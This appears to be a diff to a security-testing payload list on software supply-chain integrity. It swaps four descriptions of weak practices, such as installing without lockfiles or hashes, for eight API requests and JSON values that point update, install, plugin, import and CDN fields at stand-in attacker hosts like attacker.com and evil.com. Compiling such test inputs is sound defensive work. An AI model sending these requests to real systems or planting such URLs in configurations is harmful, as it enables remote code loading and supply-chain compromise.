@@ -1,4 +1,8 @@
-npm install without package-lock.json
-pip install without hashes
-download without checksum verification
-software update over HTTP
+PUT /api/update {"url":"http://attacker.com/malicious.pkg"}
+POST /api/install {"package":"evil-package","version":"latest"}
+GET /api/fetch?url=http://attacker.com/script.js
+POST /api/webhook {"callback":"http://attacker.com/hook"}
+PUT /api/plugin {"source":"http://untrusted.com/plugin.zip"}
+POST /api/import {"feed":"http://attacker.com/data.xml"}
+{"cdn_url":"http://attacker.com/jquery.min.js"}
+{"update_endpoint":"http://evil.com/update"}
